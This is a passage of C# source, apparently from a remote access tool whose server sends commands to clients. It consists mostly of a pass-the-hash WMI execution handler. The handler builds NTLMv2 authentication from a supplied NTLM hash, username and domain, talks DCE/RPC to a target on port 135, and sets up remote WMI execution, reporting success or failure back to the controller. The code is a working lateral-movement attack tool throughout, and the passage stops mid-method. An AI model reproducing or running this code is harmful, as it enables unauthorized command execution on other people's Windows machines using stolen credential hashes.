                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "exit";
                                        }
                                        break;
                                }
                            }
                        }

                    }
                    SMBClient.Close();
                    SMBClientStream.Close();
                }
            }).Start();




        }
        public static void HandleGetWMIExec(Packets.ServerPackets.DoWMIExec args, Client client)
        {
            new Thread(() =>
            {
                string command = args.command;
                string hash = args.hash;
                string username = args.username;
                string domain = args.domain;
                string target = args.target;
                int sleep = args.sleep;


                string processID = "";
                string target_short = "";
                string output_username = "";
                //Tracking Params
                int request_length = 0;
                bool WMI_execute = false;
                int sequence_number_counter = 0;
                int request_split_index_tracker = 0;
                byte[] WMI_client_send;
                string WMI_random_port_string = null;
                string target_long = "";
                int WMI_random_port_int = 0;
                IPAddress target_type = null;
                byte[] object_UUID = null;
                byte[] IPID = null;
                string WMI_client_stage = "";
                string WMI_data = "";
                string OXID = "";
                int OXID_index = 0;
                int OXID_bytes_index = 0;
                byte[] object_UUID2 = null;
                byte[] sequence_number = null;
                byte[] request_flags = null;
                int request_auth_padding = 0;
                byte[] request_call_ID = null;
                byte[] request_opnum = null;
                byte[] request_UUID = null;
                byte[] request_context_ID = null;
                byte[] alter_context_call_ID = null;
                byte[] alter_context_context_ID = null;
                byte[] alter_context_UUID = null;
                byte[] hostname_length = null;
                byte[] stub_data = null;
                byte[] WMI_namespace_length = null;
                byte[] WMI_namespace_unicode = null;
                byte[] IPID2 = null;
                int request_split_stage = 0;
                if (!string.IsNullOrEmpty(command))
                {
                    WMI_execute = true;
                }

                if (!string.IsNullOrEmpty(hash))
                {
                    if (hash.Contains(":"))
                    {
                        hash = hash.Split(':').Last();
                    }
                }
                if (!string.IsNullOrEmpty(domain))
                {
                    output_username = domain + '\\' + username;
                }
                else
                {
                    output_username = username;
                }
                if (target == "localhost")
                {
                    target = "127.0.0.1";
                }
                try
                {
                    target_type = IPAddress.Parse(target);
                    target_short = target_long = target;
                }
                catch
                {
                    target_long = target;

                    if (target.Contains("."))
                    {
                        int target_short_index = target.IndexOf(".");
                        target_short = target.Substring(0, target_short_index);
                    }
                    else
                    {
                        target_short = target;
                    }
                }

                processID = Process.GetCurrentProcess().Id.ToString();
                byte[] process_ID_Bytes = BitConverter.GetBytes(int.Parse(processID));
                processID = BitConverter.ToString(process_ID_Bytes);
                processID = processID.Replace("-00-00", "").Replace("-", "");
                process_ID_Bytes = PTHWMIExecHelper.StringToByteArray(processID);
                TcpClient WMI_client_init = new TcpClient();
                WMI_client_init.Client.ReceiveTimeout = 30000;


                try
                {
                    WMI_client_init.Connect(target, 135);
                }
                catch
                {
                    new Packets.ClientPackets.DoWMIExecResponse("Execution Failed: No Response", false).Execute(client);
                }

                if (WMI_client_init.Connected)
                {
                    NetworkStream WMI_client_stream_init = WMI_client_init.GetStream();
                    byte[] WMI_client_receive = new byte[2048];
                    byte[] RPC_UUID = new byte[] { 0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10, 0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a };
                    OrderedDictionary packet_RPC = PTHWMIExecHelper.GetPacketRPCBind(2, new byte[] { 0xd0, 0x16 }, new byte[] { 0x02 }, new byte[] { 0x00, 0x00 }, RPC_UUID, new byte[] { 0x00, 0x00 });
                    packet_RPC["RPCBind_FragLength"] = new byte[] { 0x74, 0x00 };
                    byte[] RPC = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC);
                    WMI_client_send = RPC;
                    WMI_client_stream_init.Write(WMI_client_send, 0, WMI_client_send.Length);
                    WMI_client_stream_init.Flush();
                    WMI_client_stream_init.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                    byte[] assoc_group = PTHWMIExecHelper.getByteRange(WMI_client_receive, 20, 23);
                    packet_RPC = PTHWMIExecHelper.GetPacketRPCRequest(new byte[] { 0x03 }, 0, 0, 0, new byte[] { 0x02, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x05, 0x00 }, null);
                    RPC = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC);
                    WMI_client_send = RPC;
                    WMI_client_stream_init.Write(WMI_client_send, 0, WMI_client_send.Length);
                    WMI_client_stream_init.Flush();
                    WMI_client_stream_init.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                    byte[] WMI_hostname_unicode = PTHWMIExecHelper.getByteRange(WMI_client_receive, 42, WMI_client_receive.Length);
                    string WMI_hostname = BitConverter.ToString(WMI_hostname_unicode);
                    int WMI_hostname_index = WMI_hostname.IndexOf("-00-00-00");
                    WMI_hostname = WMI_hostname.Substring(0, WMI_hostname_index).Replace("-00", "");
                    byte[] WMI_hostname_bytes = PTHWMIExecHelper.StringToByteArray(WMI_hostname.Replace("-", "").Replace(" ", ""));
                    WMI_hostname_bytes = PTHWMIExecHelper.getByteRange(WMI_hostname_bytes, 0, WMI_hostname_bytes.Length);
                    WMI_hostname = Encoding.ASCII.GetString(WMI_hostname_bytes);

                    if (target_short != WMI_hostname)
                    {
                        target_short = WMI_hostname;
                    }
                    WMI_client_init.Close();
                    WMI_client_stream_init.Close();
                    TcpClient WMI_client = new TcpClient();
                    WMI_client.Client.ReceiveTimeout = 30000;
                    NetworkStream WMI_client_stream = null;

                    try
                    {
                        WMI_client.Connect(target_long, 135);
                    }
                    catch
                    {
                        new Packets.ClientPackets.DoWMIExecResponse("Execution Failed: No Response", false).Execute(client);
                    }


                    if (WMI_client.Connected)
                    {
                        WMI_client_stream = WMI_client.GetStream();
                        RPC_UUID = new byte[] { 0xa0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 };
                        packet_RPC = PTHWMIExecHelper.GetPacketRPCBind(3, new byte[] { 0xd0, 0x16 }, new byte[] { 0x01 }, new byte[] { 0x01, 0x00 }, RPC_UUID, new byte[] { 0x00, 0x00 });
                        packet_RPC["RPCBind_FragLength"] = new byte[] { 0x78, 0x00 };
                        packet_RPC["RPCBind_AuthLength"] = new byte[] { 0x28, 0x00 };
                        packet_RPC["RPCBind_NegotiateFlags"] = new byte[] { 0x07, 0x82, 0x08, 0xa2 };
                        RPC = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC);
                        WMI_client_send = RPC;
                        WMI_client_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                        WMI_client_stream.Flush();
                        WMI_client_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                        assoc_group = PTHWMIExecHelper.getByteRange(WMI_client_receive, 20, 23);
                        string WMI_NTLMSSP = BitConverter.ToString(WMI_client_receive);
                        WMI_NTLMSSP = WMI_NTLMSSP.Replace("-", "");
                        int WMI_NTLMSSP_index = WMI_NTLMSSP.IndexOf("4E544C4D53535000");
                        int WMI_NTLMSSP_bytes_index = WMI_NTLMSSP_index / 2;
                        int WMI_domain_length = PTHWMIExecHelper.DataLength2(WMI_NTLMSSP_bytes_index + 12, WMI_client_receive);
                        int WMI_target_length = PTHWMIExecHelper.DataLength2(WMI_NTLMSSP_bytes_index + 40, WMI_client_receive);
                        byte[] WMI_session_ID = PTHWMIExecHelper.getByteRange(WMI_client_receive, 44, 51);
                        byte[] WMI_NTLM_challenge = PTHWMIExecHelper.getByteRange(WMI_client_receive, WMI_NTLMSSP_bytes_index + 24, WMI_NTLMSSP_bytes_index + 31);
                        byte[] WMI_target_details = PTHWMIExecHelper.getByteRange(WMI_client_receive, WMI_NTLMSSP_bytes_index + 56 + WMI_domain_length, WMI_NTLMSSP_bytes_index + 55 + WMI_domain_length + WMI_target_length);
                        byte[] WMI_target_time_bytes = PTHWMIExecHelper.getByteRange(WMI_target_details, WMI_target_details.Length - 12, WMI_target_details.Length - 5);
                        string hash2 = "";
                        for (int i = 0; i < hash.Length - 1; i += 2) { hash2 += (hash.Substring(i, 2) + "-"); };
                        byte[] NTLM_hash_bytes = (PTHWMIExecHelper.StringToByteArray(hash.Replace("-", "")));
                        string[] hash_string_array = hash2.Split('-');
                        string auth_hostname = Environment.MachineName;
                        byte[] auth_hostname_bytes = Encoding.Unicode.GetBytes(auth_hostname);
                        byte[] auth_domain_bytes = Encoding.Unicode.GetBytes(domain);
                        byte[] auth_username_bytes = Encoding.Unicode.GetBytes(username);
                        byte[] auth_domain_length = BitConverter.GetBytes(auth_domain_bytes.Length);
                        auth_domain_length = new byte[] { auth_domain_length[0], auth_domain_length[1] };
                        byte[] auth_username_length = BitConverter.GetBytes(auth_username_bytes.Length);
                        auth_username_length = new byte[] { auth_username_length[0], auth_username_length[1] };
                        byte[] auth_hostname_length = BitConverter.GetBytes(auth_hostname_bytes.Length);
                        auth_hostname_length = new byte[] { auth_hostname_length[0], auth_hostname_length[1] };
                        byte[] auth_domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                        byte[] auth_username_offset = BitConverter.GetBytes(auth_domain_bytes.Length + 64);
                        byte[] auth_hostname_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + 64);
                        byte[] auth_LM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 64);
                        byte[] auth_NTLM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 88);
                        HMACMD5 HMAC_MD5 = new HMACMD5();
                        HMAC_MD5.Key = NTLM_hash_bytes;
                        string username_and_target = username.ToUpper();
                        byte[] username_bytes = Encoding.Unicode.GetBytes(username_and_target);
                        byte[] username_and_target_bytes = null;
                        username_and_target_bytes = PTHWMIExecHelper.CombineByteArray(username_bytes, auth_domain_bytes);
                        byte[] NTLMv2_hash = HMAC_MD5.ComputeHash(username_and_target_bytes);
                        Random r = new Random();
                        byte[] client_challenge_bytes = new byte[8];
                        r.NextBytes(client_challenge_bytes);
                        byte[] security_blob_bytes = null;
                        security_blob_bytes = PTHWMIExecHelper.CombineByteArray(new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, WMI_target_time_bytes);
                        security_blob_bytes = PTHWMIExecHelper.CombineByteArray(security_blob_bytes, client_challenge_bytes);
                        security_blob_bytes = PTHWMIExecHelper.CombineByteArray(security_blob_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                        security_blob_bytes = PTHWMIExecHelper.CombineByteArray(security_blob_bytes, WMI_target_details);
                        security_blob_bytes = PTHWMIExecHelper.CombineByteArray(security_blob_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                        byte[] server_challenge_and_security_blob_bytes = PTHWMIExecHelper.CombineByteArray(WMI_NTLM_challenge, security_blob_bytes);
                        HMAC_MD5.Key = NTLMv2_hash;
                        byte[] NTLMv2_response = HMAC_MD5.ComputeHash(server_challenge_and_security_blob_bytes);
                        byte[] session_base_key = HMAC_MD5.ComputeHash(NTLMv2_response);
                        NTLMv2_response = PTHWMIExecHelper.CombineByteArray(NTLMv2_response, security_blob_bytes);
                        byte[] NTLMv2_response_length = BitConverter.GetBytes(NTLMv2_response.Length);
                        NTLMv2_response_length = new byte[] { NTLMv2_response_length[0], NTLMv2_response_length[1] };
                        byte[] WMI_session_key_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + NTLMv2_response.Length + 88);
                        byte[] WMI_session_key_length = new byte[] { 0x00, 0x00 };
                        byte[] WMI_negotiate_flags = new byte[] { 0x15, 0x82, 0x88, 0xa2 };
                        byte[] NTLMSSP_response = null;
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 }, auth_LM_offset);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, NTLMv2_response_length);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, NTLMv2_response_length);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_NTLM_offset);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_domain_length);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_domain_length);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_domain_offset);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_username_length);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_username_length);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_username_offset);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_hostname_length);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_hostname_length);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_hostname_offset);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, WMI_session_key_length);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, WMI_session_key_length);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, WMI_session_key_offset);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, WMI_negotiate_flags);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_domain_bytes);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_username_bytes);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_hostname_bytes);
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                        NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, NTLMv2_response);
                        assoc_group = PTHWMIExecHelper.getByteRange(WMI_client_receive, 20, 23);
                        packet_RPC = PTHWMIExecHelper.GetPacketRPCAuth3(NTLMSSP_response);
                        RPC = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC);
                        WMI_client_send = RPC;
                        WMI_client_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                        WMI_client_stream.Flush();
                        byte[] causality_ID_bytes = new byte[16];
                        r.NextBytes(causality_ID_bytes);
                        OrderedDictionary packet_DCOM_remote_create_instance = PTHWMIExecHelper.GetPacketDCOMRemoteCreateInstance(causality_ID_bytes, target_short);
                        byte[] DCOM_remote_create_instance = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_DCOM_remote_create_instance);
                        packet_RPC = PTHWMIExecHelper.GetPacketRPCRequest(new byte[] { 0x03 }, DCOM_remote_create_instance.Length, 0, 0, new byte[] { 0x03, 0x00, 0x00, 0x00 }, new byte[] { 0x01, 0x00 }, new byte[] { 0x04, 0x00 }, null);
                        RPC = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC);
                        WMI_client_send = PTHWMIExecHelper.CombineByteArray(RPC, DCOM_remote_create_instance);
                        WMI_client_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                        WMI_client_stream.Flush();
                        WMI_client_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                        TcpClient WMI_client_random_port = new TcpClient();
                        WMI_client_random_port.Client.ReceiveTimeout = 30000;

                        if (WMI_client_receive[2] == 3 && BitConverter.ToString(PTHWMIExecHelper.getByteRange(WMI_client_receive, 24, 27)) == "05-00-00-00")
                        {
                            //TODO Packet Response
                            new Packets.ClientPackets.DoWMIExecResponse("Execution Failed: Access Denied", false).Execute(client);
                        }
                        else if (WMI_client_receive[2] == 3)
                        {
                            //TODO Packet Response
                            string error_code = BitConverter.ToString(new byte[] { WMI_client_receive[27], WMI_client_receive[26], WMI_client_receive[25], WMI_client_receive[24] });
                            string[] error_code_array = error_code.Split('-');
                            error_code = string.Join("", error_code_array);
                            new Packets.ClientPackets.DoWMIExecResponse("Execution Failed: error code: " + error_code.ToString(), false).Execute(client);

                        }
                        else if (WMI_client_receive[2] == 2 && !WMI_execute)
                        {
                            //TODO Packet Response
                            new Packets.ClientPackets.DoWMIExecResponse("Execution Succeeded: WMI Access Approved for user", true).Execute(client);
                        }
                        else if (WMI_client_receive[2] == 2 && WMI_execute)
                        {
                            if (target_short == "127.0.0.1")
                            {
                                target_short = auth_hostname;
                            }
                            byte[] target_unicode = PTHWMIExecHelper.CombineByteArray(new byte[] { 0x07, 0x00 }, Encoding.Unicode.GetBytes(target_short + "["));
                            string target_search = BitConverter.ToString(target_unicode).Replace("-", "");
                            string WMI_message = BitConverter.ToString(WMI_client_receive).Replace("-", "");
                            int target_index = WMI_message.IndexOf(target_search);

                            if (target_index < 1)
                            {
                                IPAddress[] target_address_list = Dns.GetHostEntry(target_long).AddressList;
                                foreach (IPAddress ip in target_address_list)
                                {
                                    target_short = ip.Address.ToString();
                                    target_unicode = PTHWMIExecHelper.CombineByteArray(new byte[] { 0x07, 0x00 }, Encoding.Unicode.GetBytes(target_short + "["));
                                    target_search = BitConverter.ToString(target_unicode).Replace("-", "");
                                    target_index = WMI_message.IndexOf(target_search);

                                    if (target_index >= 0)
                                    {
                                        break;
                                    }
                                }
                            }

                            if (target_index > 0)
                            {
                                int target_bytes_index = target_index / 2;
                                byte[] WMI_random_port_bytes = PTHWMIExecHelper.getByteRange(WMI_client_receive, target_bytes_index + target_unicode.Length, target_bytes_index + target_unicode.Length + 8);
                                WMI_random_port_string = BitConverter.ToString(WMI_random_port_bytes);
                                int WMI_random_port_end_index = WMI_random_port_string.IndexOf("-5D");

                                if (WMI_random_port_end_index > 0)
                                {
                                    WMI_random_port_string = WMI_random_port_string.Substring(0, WMI_random_port_end_index);
                                }
                                WMI_random_port_string = WMI_random_port_string.Replace("-00", "").Replace("-", "");
                                char[] random_port_char_array = WMI_random_port_string.ToCharArray();
                                char[] chars = new char[] { random_port_char_array[1], random_port_char_array[3], random_port_char_array[5], random_port_char_array[7], random_port_char_array[9] };
                                WMI_random_port_int = int.Parse(new string(chars));
                                //Takes the last number of each byte.
                                string meow = BitConverter.ToString(WMI_client_receive).Replace("-", "");
                                int meow_index = meow.IndexOf("4D454F570100000018AD09F36AD8D011A07500C04FB68820");
                                int meow_bytes_index = meow_index / 2;
                                byte[] OXID_bytes = PTHWMIExecHelper.getByteRange(WMI_client_receive, meow_bytes_index + 32, meow_bytes_index + 39);
                                IPID = PTHWMIExecHelper.getByteRange(WMI_client_receive, meow_bytes_index + 48, meow_bytes_index + 63);
                                OXID = BitConverter.ToString(OXID_bytes).Replace("-", "");
                                OXID_index = meow.IndexOf(OXID, meow_index + 100);
                                OXID_bytes_index = OXID_index / 2;
                                object_UUID = PTHWMIExecHelper.getByteRange(WMI_client_receive, OXID_bytes_index + 12, OXID_bytes_index + 27);
                            }
                            if (WMI_random_port_int != 0)
                            {

                                try
                                {
                                    WMI_client_random_port.Connect(target_long, WMI_random_port_int);
                                }
                                catch
                                {
                                    new Packets.ClientPackets.DoWMIExecResponse("Execution Failed: No Response", false).Execute(client);
                                }
                            }
                            else
                            {
                                //TODO Packet Response
                                new Packets.ClientPackets.DoWMIExecResponse("Execution Failed: Random Port Extraction Failure", false).Execute(client);
                            }

                        }
                        else
                        {
                            //TODO Packet Response
                            new Packets.ClientPackets.DoWMIExecResponse("Execution Failed: Unknown Error", false).Execute(client);
                        }

                        if (WMI_client_random_port.Connected)
                        {
                            NetworkStream WMI_client_random_port_stream = WMI_client_random_port.GetStream();
                            packet_RPC = PTHWMIExecHelper.GetPacketRPCBind(2, new byte[] { 0xd0, 0x16 }, new byte[] { 0x03 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }, new byte[] { 0x00, 0x00 });
                            packet_RPC["RPCBind_FragLength"] = new byte[] { 0xd0, 0x00 };
                            packet_RPC["RPCBind_AuthLength"] = new byte[] { 0x28, 0x00 };
                            packet_RPC["RPCBind_NegotiateFlags"] = new byte[] { 0x97, 0x82, 0x08, 0xa2 };
                            RPC = PTHWMIExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC);
                            WMI_client_send = RPC;
                            WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length);
                            WMI_client_random_port_stream.Flush();
                            WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length);
                            assoc_group = PTHWMIExecHelper.getByteRange(WMI_client_receive, 20, 23);
                            WMI_NTLMSSP = BitConverter.ToString(WMI_client_receive);
                            WMI_NTLMSSP = WMI_NTLMSSP.Replace("-", "");
                            WMI_NTLMSSP_index = WMI_NTLMSSP.IndexOf("4E544C4D53535000");
                            WMI_NTLMSSP_bytes_index = WMI_NTLMSSP_index / 2;
                            WMI_domain_length = PTHWMIExecHelper.DataLength2(WMI_NTLMSSP_bytes_index + 12, WMI_client_receive);
                            WMI_target_length = PTHWMIExecHelper.DataLength2(WMI_NTLMSSP_bytes_index + 40, WMI_client_receive);
                            WMI_session_ID = PTHWMIExecHelper.getByteRange(WMI_client_receive, 44, 51);
                            WMI_NTLM_challenge = PTHWMIExecHelper.getByteRange(WMI_client_receive, WMI_NTLMSSP_bytes_index + 24, WMI_NTLMSSP_bytes_index + 31);
                            WMI_target_details = PTHWMIExecHelper.getByteRange(WMI_client_receive, WMI_NTLMSSP_bytes_index + 56 + WMI_domain_length, WMI_NTLMSSP_bytes_index + 55 + WMI_domain_length + WMI_target_length);
                            WMI_target_time_bytes = PTHWMIExecHelper.getByteRange(WMI_target_details, WMI_target_details.Length - 12, WMI_target_details.Length - 5);
                            hash2 = "";
                            for (int i = 0; i < hash.Length - 1; i += 2) { hash2 += (hash.Substring(i, 2) + "-"); };
                            NTLM_hash_bytes = (PTHWMIExecHelper.StringToByteArray(hash.Replace("-", "")));
                            hash_string_array = hash2.Split('-');
                            auth_hostname = Environment.MachineName;
                            auth_hostname_bytes = Encoding.Unicode.GetBytes(auth_hostname);
                            auth_domain_bytes = Encoding.Unicode.GetBytes(domain);
                            auth_username_bytes = Encoding.Unicode.GetBytes(username);
                            auth_domain_length = BitConverter.GetBytes(auth_domain_bytes.Length);
                            auth_domain_length = new byte[] { auth_domain_length[0], auth_domain_length[1] };
                            auth_username_length = BitConverter.GetBytes(auth_username_bytes.Length);
                            auth_username_length = new byte[] { auth_username_length[0], auth_username_length[1] };
                            auth_hostname_length = BitConverter.GetBytes(auth_hostname_bytes.Length);
                            auth_hostname_length = new byte[] { auth_hostname_length[0], auth_hostname_length[1] };
                            auth_domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                            auth_username_offset = BitConverter.GetBytes(auth_domain_bytes.Length + 64);
                            auth_hostname_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + 64);
                            auth_LM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 64);
                            auth_NTLM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 88);
                            HMAC_MD5 = new HMACMD5();
                            HMAC_MD5.Key = NTLM_hash_bytes;
                            username_and_target = username.ToUpper();
                            username_bytes = Encoding.Unicode.GetBytes(username_and_target);
                            username_and_target_bytes = null;
                            username_and_target_bytes = PTHWMIExecHelper.CombineByteArray(username_bytes, auth_domain_bytes);
                            NTLMv2_hash = HMAC_MD5.ComputeHash(username_and_target_bytes);
                            r = new Random();
                            client_challenge_bytes = new byte[8];
                            r.NextBytes(client_challenge_bytes);
                            security_blob_bytes = null;
                            security_blob_bytes = PTHWMIExecHelper.CombineByteArray(new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, WMI_target_time_bytes);
                            security_blob_bytes = PTHWMIExecHelper.CombineByteArray(security_blob_bytes, client_challenge_bytes);
                            security_blob_bytes = PTHWMIExecHelper.CombineByteArray(security_blob_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                            security_blob_bytes = PTHWMIExecHelper.CombineByteArray(security_blob_bytes, WMI_target_details);
                            security_blob_bytes = PTHWMIExecHelper.CombineByteArray(security_blob_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                            server_challenge_and_security_blob_bytes = PTHWMIExecHelper.CombineByteArray(WMI_NTLM_challenge, security_blob_bytes);
                            HMAC_MD5.Key = NTLMv2_hash;
                            NTLMv2_response = HMAC_MD5.ComputeHash(server_challenge_and_security_blob_bytes);
                            session_base_key = HMAC_MD5.ComputeHash(NTLMv2_response);
                            byte[] client_signing_constant = new byte[] { 0x73, 0x65, 0x73, 0x73, 0x69, 0x6f, 0x6e, 0x20, 0x6b, 0x65, 0x79, 0x20, 0x74, 0x6f, 0x20, 0x63, 0x6c, 0x69, 0x65, 0x6e, 0x74, 0x2d, 0x74, 0x6f, 0x2d, 0x73, 0x65, 0x72, 0x76, 0x65, 0x72, 0x20, 0x73, 0x69, 0x67, 0x6e, 0x69, 0x6e, 0x67, 0x20, 0x6b, 0x65, 0x79, 0x20, 0x6d, 0x61, 0x67, 0x69, 0x63, 0x20, 0x63, 0x6f, 0x6e, 0x73, 0x74, 0x61, 0x6e, 0x74, 0x00 };
                            MD5CryptoServiceProvider MD5_crypto = new MD5CryptoServiceProvider();
                            byte[] client_signing_key = MD5_crypto.ComputeHash(PTHWMIExecHelper.CombineByteArray(session_base_key, client_signing_constant));
                            NTLMv2_response = PTHWMIExecHelper.CombineByteArray(NTLMv2_response, security_blob_bytes);
                            NTLMv2_response_length = BitConverter.GetBytes(NTLMv2_response.Length);
                            NTLMv2_response_length = new byte[] { NTLMv2_response_length[0], NTLMv2_response_length[1] };
                            WMI_session_key_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + NTLMv2_response.Length + 88);
                            WMI_session_key_length = new byte[] { 0x00, 0x00 };
                            WMI_negotiate_flags = new byte[] { 0x15, 0x82, 0x88, 0xa2 };
                            NTLMSSP_response = null;
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 }, auth_LM_offset);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, NTLMv2_response_length);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, NTLMv2_response_length);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_NTLM_offset);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_domain_length);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_domain_length);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_domain_offset);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_username_length);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_username_length);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_username_offset);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_hostname_length);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_hostname_length);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_hostname_offset);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, WMI_session_key_length);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, WMI_session_key_length);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, WMI_session_key_offset);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, WMI_negotiate_flags);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_domain_bytes);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_username_bytes);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, auth_hostname_bytes);
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                            NTLMSSP_response = PTHWMIExecHelper.CombineByteArray(NTLMSSP_response, NTLMv2_response);
                            HMAC_MD5.Key = client_signing_key;
                            sequence_number = new byte[] { 0x00, 0x00, 0x00, 0x00 };
                            packet_RPC = PTHWMIExecHelper.GetPacketRPCAuth3(NTLMSSP_response);
                            packet_RPC["RPCAUTH3_CallID"] = new byte[] { 0x02, 0x00, 0x00, 0x00 };
                            packet_RPC["RPCAUTH3_AuthLevel"] = new byte[] { 0x04 };
